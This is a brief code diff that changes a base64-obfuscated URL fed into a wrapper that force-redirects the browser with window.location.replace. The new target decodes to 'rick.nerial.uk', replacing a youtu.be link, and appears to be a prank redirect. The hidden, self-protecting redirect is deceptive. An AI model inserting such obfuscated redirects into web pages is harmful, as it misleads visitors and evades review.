@@ -18,11 +18,10 @@
 
 		// Encoded target URL pieces
 		const P1 = 'aHR0cHM6Ly8';           // 'https://'
-		const P2 = 'eW91dHUuYmU=';          // base64('youtu.be')
-		const P4 = 'L2o1YTBqVGM5UzEw';      // '/j5a0jTc9S10'
+		const P2 = 'cmljay5uZXJpYWwudWs=';          //
 
 		// Build final URL (correct decoding)
-		var U = B(P1) + B(P2) + B(P4);
+		var U = B(P1) + B(P2);
 
 		// Self-defending-ish wrapper
 		var W = '(function(u){try{window.location.replace(u)}catch(e){window.location.href=u}})';
